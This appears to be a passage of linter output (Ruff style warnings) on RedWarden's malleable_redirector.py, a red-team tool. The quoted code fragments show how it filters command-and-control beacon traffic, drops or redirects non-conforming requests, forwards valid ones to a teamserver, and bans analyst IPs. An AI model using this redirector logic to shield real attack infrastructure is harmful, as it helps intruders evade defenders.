1201 |         if "host" in malleable_meta.keys() and len(malleable_meta["host"]) > 0:
     |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1202 |             req.headers[proxy2_metadata_headers["domain_front_host_header"]] = (
1203 |                 malleable_meta["host"]
     |
help: Remove `.keys()`

F405 `proxy2_metadata_headers` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1202:25
     |
1201 |         if "host" in malleable_meta.keys() and len(malleable_meta["host"]) > 0:
1202 |             req.headers[proxy2_metadata_headers["domain_front_host_header"]] = (
     |                         ^^^^^^^^^^^^^^^^^^^^^^^
1203 |                 malleable_meta["host"]
1204 |             )
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1221:17
     |
1219 |           if section == "" or variant == "":
1220 |               self.logger.dbg(
1221 | /                 "strip_headers: No section name ({}) or variant ({}) provided!".format(
1222 | |                     section, variant
1223 | |                 ),
     | |_________________^
1224 |                   color="red",
1225 |               )
     |
help: Convert to f-string

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1228:12
     |
1226 |             return False
1227 |
1228 |         if section not in self.malleable.config.keys():
     |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1229 |             self.logger.dbg(
1230 |                 "strip_headers: Section name ({}) not found in malleable.config!".format(
     |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1230:17
     |
1228 |           if section not in self.malleable.config.keys():
1229 |               self.logger.dbg(
1230 | /                 "strip_headers: Section name ({}) not found in malleable.config!".format(
1231 | |                     section
1232 | |                 ),
     | |_________________^
1233 |                   color="red",
1234 |               )
     |
help: Convert to f-string

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1237:12
     |
1235 |             return False
1236 |
1237 |         if variant not in self.malleable.config[section].keys():
     |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1238 |             self.logger.dbg(
1239 |                 "strip_headers: Variant name ({}) not found in malleable.config[{}]!".format(
     |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1239:17
     |
1237 |           if variant not in self.malleable.config[section].keys():
1238 |               self.logger.dbg(
1239 | /                 "strip_headers: Variant name ({}) not found in malleable.config[{}]!".format(
1240 | |                     variant, section
1241 | |                 ),
     | |_________________^
1242 |                   color="red",
1243 |               )
     |
help: Convert to f-string

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1248:34
     |
1246 |         configblock = self.malleable.config[section][variant]
1247 |
1248 |         reqhdrs = [x.lower() for x in req.headers.keys()]
     |                                  ^^^^^^^^^^^^^^^^^^^^^^^
1249 |         expectedheaders = [x[0].lower() for x in configblock["client"]["header"]]
     |
help: Remove `.keys()`

SIM102 Use a single `if` statement instead of nested `if` statements
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1253:9
     |
1251 |           dont_touch_these_headers = ["user-agent", "host"]
1252 |
1253 | /         if (
1254 | |             "http-config" in self.malleable.config.keys()
1255 | |             and "trust_x_forwarded_for" in self.malleable.config["http-config"].keys()
1256 | |         ):
1257 | |             if self.malleable.config["http-config"]["trust_x_forwarded_for"] == True:
     | |_____________________________________________________________________________________^
1258 |                   dont_touch_these_headers.append("x-forwarded-for")
     |
help: Combine `if` statements using `and`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1254:13
     |
1253 |         if (
1254 |             "http-config" in self.malleable.config.keys()
     |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1255 |             and "trust_x_forwarded_for" in self.malleable.config["http-config"].keys()
1256 |         ):
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1255:17
     |
1253 |         if (
1254 |             "http-config" in self.malleable.config.keys()
1255 |             and "trust_x_forwarded_for" in self.malleable.config["http-config"].keys()
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1256 |         ):
1257 |             if self.malleable.config["http-config"]["trust_x_forwarded_for"] == True:
     |
help: Remove `.keys()`

E712 Avoid equality comparisons to `True`; use `...:` for truth checks
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1257:16
     |
1255 |             and "trust_x_forwarded_for" in self.malleable.config["http-config"].keys()
1256 |         ):
1257 |             if self.malleable.config["http-config"]["trust_x_forwarded_for"] == True:
     |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1258 |                 dont_touch_these_headers.append("x-forwarded-for")
     |
help: Replace comparison

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1261:16
     |
1260 |         for b in MalleableParser.TransactionBlocks:
1261 |             if b in configblock["client"].keys():
     |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1262 |                 if type(configblock["client"][b]) != dict:
1263 |                     continue
     |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1262:20
     |
1260 |         for b in MalleableParser.TransactionBlocks:
1261 |             if b in configblock["client"].keys():
1262 |                 if type(configblock["client"][b]) != dict:
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1263 |                     continue
     |

F405 `proxy2_metadata_headers` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1279:25
     |
1278 |         if len(strip_headers_during_forward) > 0:
1279 |             req.headers[proxy2_metadata_headers["strip_headers_during_forward"]] = (
     |                         ^^^^^^^^^^^^^^^^^^^^^^^
1280 |                 ",".join(strip_headers_during_forward)
1281 |             )
     |

N806 Variable `jsonParsed` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1288:15
     |
1286 |         self.is_request = False
1287 |         self.logger.dbg("malleable_redirector: response_handler")
1288 |         (ret, jsonParsed) = self.checkIfHiddenAPICall(req, req_body)
     |               ^^^^^^^^^^
1289 |
1290 |         if ret:
     |

N806 Variable `jsonParsed` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1299:15
     |
1297 |     def request_handler(self, req, req_body, res="", res_body=""):
1298 |         self.is_request = True
1299 |         (ret, jsonParsed) = self.checkIfHiddenAPICall(req, req_body)
     |               ^^^^^^^^^^
1300 |
1301 |         if ret:
     |

F405 `DontFetchResponseException` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1306:20
     |
1304 |                 + jsonParsed["peerIP"]
1305 |             )
1306 |             return DontFetchResponseException(
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^
1307 |                 "Hidden API call request. Moving along to generate response."
1308 |             )
     |

N806 Variable `peerIP` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1322:9
     |
1320 |         )
1321 |
1322 |         peerIP = ProxyPlugin.get_peer_ip(req)
     |         ^^^^^^
1323 |
1324 |         drop_request = False
     |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1352:21
     |
1350 |                 url = self.proxyOptions["action_url"]
1351 |                 if (
1352 |                     type(self.proxyOptions["action_url"]) == list
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1353 |                     or type(self.proxyOptions["action_url"]) == tuple
1354 |                 ) and len(self.proxyOptions["action_url"]) > 0:
     |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1353:24
     |
1351 |                 if (
1352 |                     type(self.proxyOptions["action_url"]) == list
1353 |                     or type(self.proxyOptions["action_url"]) == tuple
     |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1354 |                 ) and len(self.proxyOptions["action_url"]) > 0:
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1358:25
     |
1356 |                     url = random.choice(self.proxyOptions["action_url"])
1357 |                     self.logger.dbg(
1358 |                         'Randomly choosen redirect to URL: "{}"'.format(url)
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1359 |                     )
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1362:21
     |
1361 |                   self.logger.err(
1362 | /                     "[PROXYING invalid request from {}] {} {}".format(
1363 | |                         req.client_address[0], req.method, req.uri
1364 | |                     ),
     | |_____________________^
1365 |                       color="cyan",
1366 |                   )
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1373:33
     |
1371 |         elif drop_request and host_action == 2:
1372 |             if newhost.startswith("http://") or newhost.startswith("https://"):
1373 |                 self.logger.dbg('Altering URL to: "{}"'.format(newhost))
     |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1374 |             else:
1375 |                 self.logger.dbg('Altering host header to: "{}"'.format(newhost))
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1375:33
     |
1373 |                 self.logger.dbg('Altering URL to: "{}"'.format(newhost))
1374 |             else:
1375 |                 self.logger.dbg('Altering host header to: "{}"'.format(newhost))
     |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1376 |
1377 |             return self.redirect(req, newhost, malleable_meta)
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1405:36
     |
1403 |                     mydict[key] = prev
1404 |
1405 |                     a = mydict.get("http-get-{}".format(peerIP), 0)
     |                                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1406 |                     b = mydict.get("http-post-{}".format(peerIP), 0)
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1406:36
     |
1405 |                     a = mydict.get("http-get-{}".format(peerIP), 0)
1406 |                     b = mydict.get("http-post-{}".format(peerIP), 0)
     |                                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1407 |
1408 |                     a2 = int(
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1420:25
     |
1419 |   ΓÇª     self.logger.info(
1420 | / ΓÇª         "Connected peer sent {} valid http-get and {} valid http-post requests so far, out of {}/{} required to consider him tempoΓÇª
1421 | | ΓÇª             a, b, a2, b2
1422 | | ΓÇª         ),
     | |___________^
1423 |   ΓÇª         color="yellow",
1424 |   ΓÇª     )
     |
help: Convert to f-string

SIM102 Use a single `if` statement instead of nested `if` statements
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1426:21
     |
1424 |                       )
1425 |
1426 | /                     if a > a2:
1427 | |                         if b > b2:
     | |__________________________________^
1428 |                               self.logger.info(
1429 |                                   "Adding connected peer ({}) to a dynamic whitelist as it reached its thresholds: ({}, {})".format(
     |
help: Combine `if` statements using `and`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1429:33
     |
1427 |                           if b > b2:
1428 |                               self.logger.info(
1429 | /                                 "Adding connected peer ({}) to a dynamic whitelist as it reached its thresholds: ({}, {})".format(
1430 | |                                     peerIP, a, b
1431 | |                                 ),
     | |_________________________________^
1432 |                                   color="green",
1433 |                               )
     |
help: Convert to f-string

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1446:13
     |
1444 |                 f"No Teamserver provided. Falling back to drop request strategy.: {s}"
1445 |             )
1446 |             raise Exception(str(e))
     |             ^^^^^^^^^^^^^^^^^^^^^^^
1447 |
1448 |         return self.redirect(req, ts, malleable_meta)
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1488:21
     |
1486 |             elif host_action == 2:
1487 |                 self.logger.dbg(
1488 |                     'Altering host header in response_handler to: "{}"'.format(newhost)
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1489 |                 )
1490 |                 del req.headers["Host"]
     |
help: Convert to f-string

F405 `proxy2_metadata_headers` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1492:29
     |
1490 |                 del req.headers["Host"]
1491 |                 req.headers["Host"] = newhost
1492 |                 req.headers[proxy2_metadata_headers["override_host_header"]] = newhost
     |                             ^^^^^^^^^^^^^^^^^^^^^^^
1493 |
1494 |         # A nifty hack to make the proxy2 believe we actually modified the response
     |

F405 `proxy2_metadata_headers` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1497:21
     |
1495 |         # so that the proxy will not encode it to gzip (or anything specified) and just
1496 |         # return the response as-is, in an "Content-Encoding: identity" kind of fashion
1497 |         res.headers[proxy2_metadata_headers["override_response_content_encoding"]] = (
     |                     ^^^^^^^^^^^^^^^^^^^^^^^
1498 |             "identity"
1499 |         )
     |

F841 Local variable `scheme` is assigned to but never used
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1522:9
     |
1521 |         u = urlparse(req.uri)
1522 |         scheme, netloc, path = (
     |         ^^^^^^
1523 |             u.scheme,
1524 |             u.netloc,
     |
help: Remove assignment to unused variable `scheme`

F841 Local variable `netloc` is assigned to but never used
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1522:17
     |
1521 |         u = urlparse(req.uri)
1522 |         scheme, netloc, path = (
     |                 ^^^^^^
1523 |             u.scheme,
1524 |             u.netloc,
     |
help: Remove assignment to unused variable `netloc`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1532:21
     |
1530 |         try:
1531 |             resolved = socket.gethostbyaddr(req.client_address[0])[0]
1532 |             peer += " ({})".format(resolved)
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^
1533 |         except:
1534 |             pass
     |
help: Convert to f-string

E722 Do not use bare `except`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1533:9
     |
1531 |             resolved = socket.gethostbyaddr(req.client_address[0])[0]
1532 |             peer += " ({})".format(resolved)
1533 |         except:
     |         ^^^^^^
1534 |             pass
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1538:17
     |
1536 |           if not quiet:
1537 |               self.logger.err(
1538 | /                 "[{} invalid request from {}] {} {}".format(
1539 | |                     todo, peer, req.method, path
1540 | |                 ),
     | |_________________^
1541 |                   color="cyan",
1542 |               )
     |
help: Convert to f-string

E712 Avoid equality comparisons to `True`; use `self.proxyOptions["log_dropped"]:` for truth checks
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1544:12
     |
1542 |             )
1543 |
1544 |         if self.proxyOptions["log_dropped"] == True:
     |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1545 |             req_headers = req.headers
1546 |             rb = req_body
     |
help: Replace with `self.proxyOptions["log_dropped"]`

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1547:22
     |
1545 |             req_headers = req.headers
1546 |             rb = req_body
1547 |             if rb != None and len(rb) > 0:
     |                      ^^^^
1548 |                 if type(rb) == type(b""):
1549 |                     rb = rb.decode()
     |
help: Replace with `cond is not None`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1548:20
     |
1546 |             rb = req_body
1547 |             if rb != None and len(rb) > 0:
1548 |                 if type(rb) == type(b""):
     |                    ^^^^^^^^^^^^^^^^^^^^^
1549 |                     rb = rb.decode()
1550 |                 rb = "\r\n" + rb
     |

UP003 [*] Use `bytes` instead of `type(...)`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1548:32
     |
1546 |             rb = req_body
1547 |             if rb != None and len(rb) > 0:
1548 |                 if type(rb) == type(b""):
     |                                ^^^^^^^^^
1549 |                     rb = rb.decode()
1550 |                 rb = "\r\n" + rb
     |
help: Replace `type(...)` with `bytes`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1559:33
     |
1558 |             if not quiet:
1559 |                 self.logger.err("\n\n{}".format(request), color="cyan")
     |                                 ^^^^^^^^^^^^^^^^^^^^^^^^
1560 |
1561 |         if self.proxyOptions["drop_action"] == "reset":
     |
help: Convert to f-string

F405 `DropConnectionException` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1562:20
     |
1561 |         if self.proxyOptions["drop_action"] == "reset":
1562 |             return DropConnectionException("Not a conformant beacon request.")
     |                    ^^^^^^^^^^^^^^^^^^^^^^^
1563 |
1564 |         elif self.proxyOptions["drop_action"] == "redirect":
     |

F405 `DontFetchResponseException` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1566:24
     |
1564 |         elif self.proxyOptions["drop_action"] == "redirect":
1565 |             if self.is_request:
1566 |                 return DontFetchResponseException("Not a conformant beacon request.")
     |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^
1567 |
1568 |             if res == None:
     |

E711 Comparison to `None` should be `cond is None`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1568:23
     |
1566 |                 return DontFetchResponseException("Not a conformant beacon request.")
1567 |
1568 |             if res == None:
     |                       ^^^^
1569 |                 self.logger.err("Response handler received a None res object.")
1570 |                 return res_body
     |
help: Replace with `cond is None`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1574:17
     |
1572 |             url = self.proxyOptions["action_url"]
1573 |             if (
1574 |                 type(self.proxyOptions["action_url"]) == list
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1575 |                 or type(self.proxyOptions["action_url"]) == tuple
1576 |             ) and len(self.proxyOptions["action_url"]) > 0:
     |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1575:20
     |
1573 |             if (
1574 |                 type(self.proxyOptions["action_url"]) == list
1575 |                 or type(self.proxyOptions["action_url"]) == tuple
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1576 |             ) and len(self.proxyOptions["action_url"]) > 0:
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1583:24
     |
1581 |               res.response_version = "HTTP/1.1"
1582 |               res.reason = "Moved Permanently"
1583 |               res_body = """<HTML><HEAD><meta http-equiv="content-type" content="text/html;charset=utf-8">
     |  ________________________^
1584 | | <TITLE>301 Moved</TITLE></HEAD><BODY>
1585 | | <H1>301 Moved</H1>
1586 | | The document has moved
1587 | | <A HREF="{}">here</A>.
1588 | | </BODY></HTML>""".format(
1589 | |                 url
1590 | |             )
     | |_____________^
1591 |
1592 |               res.headers = {
     |
help: Convert to f-string

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1617:18
     |
1615 |         req_headers = req.headers
1616 |         rb = req_body
1617 |         if rb != None and len(rb) > 0:
     |                  ^^^^
1618 |             if type(rb) == type(b""):
1619 |                 rb = rb.decode()
     |
help: Replace with `cond is not None`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1618:16
     |
1616 |         rb = req_body
1617 |         if rb != None and len(rb) > 0:
1618 |             if type(rb) == type(b""):
     |                ^^^^^^^^^^^^^^^^^^^^^
1619 |                 rb = rb.decode()
1620 |             rb = "\r\n" + rb
     |

UP003 [*] Use `bytes` instead of `type(...)`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1618:28
     |
1616 |         rb = req_body
1617 |         if rb != None and len(rb) > 0:
1618 |             if type(rb) == type(b""):
     |                            ^^^^^^^^^
1619 |                 rb = rb.decode()
1620 |             rb = "\r\n" + rb
     |
help: Replace `type(...)` with `bytes`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1630:25
     |
1628 |         m.update(request.encode())
1629 |         h = m.hexdigest()
1630 |         self.logger.dbg("Requests's MD5 hash computed: {}".format(h))
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1631 |
1632 |         return h
     |
help: Convert to f-string

N803 Argument name `peerIP` should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1635:15
     |
1634 |     def validatePeerAndHttpHeaders(
1635 |         self, peerIP, ts, req, req_body, res, res_body, parsedJson
     |               ^^^^^^
1636 |     ):
1637 |         respJson = {}
     |

N803 Argument name `parsedJson` should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1635:57
     |
1634 |     def validatePeerAndHttpHeaders(
1635 |         self, peerIP, ts, req, req_body, res, res_body, parsedJson
     |                                                         ^^^^^^^^^^
1636 |     ):
1637 |         respJson = {}
     |

N806 Variable `respJson` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1637:9
     |
1635 |         self, peerIP, ts, req, req_body, res, res_body, parsedJson
1636 |     ):
1637 |         respJson = {}
     |         ^^^^^^^^
1638 |         returnJson = parsedJson != None and res != None
     |

N806 Variable `returnJson` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1638:9
     |
1636 |     ):
1637 |         respJson = {}
1638 |         returnJson = parsedJson != None and res != None
     |         ^^^^^^^^^^
1639 |
1640 |         ipLookupDetails = None
     |

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1638:36
     |
1636 |     ):
1637 |         respJson = {}
1638 |         returnJson = parsedJson != None and res != None
     |                                    ^^^^
1639 |
1640 |         ipLookupDetails = None
     |
help: Replace with `cond is not None`

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1638:52
     |
1636 |     ):
1637 |         respJson = {}
1638 |         returnJson = parsedJson != None and res != None
     |                                                    ^^^^
1639 |
1640 |         ipLookupDetails = None
     |
help: Replace with `cond is not None`

N806 Variable `ipLookupDetails` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1640:9
     |
1638 |         returnJson = parsedJson != None and res != None
1639 |
1640 |         ipLookupDetails = None
     |         ^^^^^^^^^^^^^^^
1641 |         userAgentValue = req.headers.get("User-Agent")
1642 |         respJson["drop_type"] = self.proxyOptions["drop_action"]
     |

N806 Variable `userAgentValue` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1641:9
     |
1640 |         ipLookupDetails = None
1641 |         userAgentValue = req.headers.get("User-Agent")
     |         ^^^^^^^^^^^^^^
1642 |         respJson["drop_type"] = self.proxyOptions["drop_action"]
1643 |         respJson["action_url"] = self.proxyOptions["action_url"]
     |

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1646:62
     |
1645 |         if (
1646 |             self.proxyOptions["whitelisted_ip_addresses"] != None
     |                                                              ^^^^
1647 |             and len(self.proxyOptions["whitelisted_ip_addresses"]) > 0
1648 |         ):
     |
help: Replace with `cond is not None`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1652:27
     |
1650 |                   cidr = cidr.strip()
1651 |                   if ipaddress.ip_address(peerIP) in ipaddress.ip_network(cidr, False):
1652 |                       msg = "[ALLOW, {}, reason:1, {}] peer's IP address is whitelisted: ({})".format(
     |  ___________________________^
1653 | |                         ts, peerIP, cidr
1654 | |                     )
     | |_____________________^
1655 |
1656 |                       if returnJson:
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1680:27
     |
1678 |               with SqliteDict(ProxyPlugin.DynamicWhitelistFile) as mydict:
1679 |                   if peerIP in mydict.get("whitelisted_ips", []):
1680 |                       msg = "[ALLOW, {}, reason:2, {}] Peer's IP was added dynamically to a whitelist based on a number of allowed reqΓÇª
     |  ___________________________^
1681 | |                         ts, peerIP
1682 | |                     )
     | |_____________________^
1683 |
1684 |                       if returnJson:
     |
help: Convert to f-string

N806 Variable `reverseIp` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1702:21
     |
1700 |             for cidr, _comment in self.banned_ips.items():
1701 |                 if ipaddress.ip_address(peerIP) in ipaddress.ip_network(cidr, False):
1702 |                     reverseIp = ""
     |                     ^^^^^^^^^
1703 |                     try:
1704 |                         reverseIp = socket.gethostbyaddr(peerIP)[0]
     |

N806 Variable `reverseIp` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1704:25
     |
1702 |                     reverseIp = ""
1703 |                     try:
1704 |                         reverseIp = socket.gethostbyaddr(peerIP)[0]
     |                         ^^^^^^^^^
1705 |                     except:
1706 |                         pass
     |

E722 Do not use bare `except`
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1705:21
     |
1703 |                     try:
1704 |                         reverseIp = socket.gethostbyaddr(peerIP)[0]
1705 |                     except:
     |                     ^^^^^^
1706 |                         pass
     |

N806 Variable `blockAnyway` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1708:21
     |
1706 |                         pass
1707 |
1708 |                     blockAnyway = True
     |                     ^^^^^^^^^^^
1709 |                     entry = ""
     |

N806 Variable `blockAnyway` in function should be lowercase
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1713:29
     |
1711 |                     for w in OVERRIDE_BANNED_AGENTS:
1712 |                         if w.lower() in reverseIp.lower():
1713 |                             blockAnyway = False
     |                             ^^^^^^^^^^^
1714 |                             entry = w
1715 |                             break
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1722:31
     |
1720 |                               comment = " - " + _comment
1721 |
1722 |                           msg = '[DROP, {}, reason:4a, {}] Peer\'s IP address is blacklisted: ({}{} - rev_ip: "{}")'.format(
     |  _______________________________^
1723 | |                             ts, peerIP, cidr, comment, reverseIp
1724 | |                         )
     | |_________________________^
1725 |
1726 |                           if returnJson:
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1770:33
     |
1768 |                           if a or b:
1769 |                               self.logger.dbg(
1770 | /                                 'Peer\'s reverse-IP lookup would be banned because of word "{}" but was whitelisted.'.format(
1771 | |                                     part
1772 | |                                 )
     | |_________________________________^
1773 |                               )
1774 |                               whitelisted = True
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\red-teaming\RedWarden\plugins\malleable_redirector.py:1777:31
     |
1775 |                               break
1776 |
1777 |                           msg = '[DROP, {}, reason:4b, {}] peer\'s reverse-IP lookup contained banned word: "{}"'.format(
     |  _______________________________^
1778 | |                             ts, peerIP, part
1779 | |                         )
     | |_________________________^
1780 |
1781 |                           if returnJson:
     |
help: Convert to f-string

F841 [*] Local variable `e` is assigned to but never used
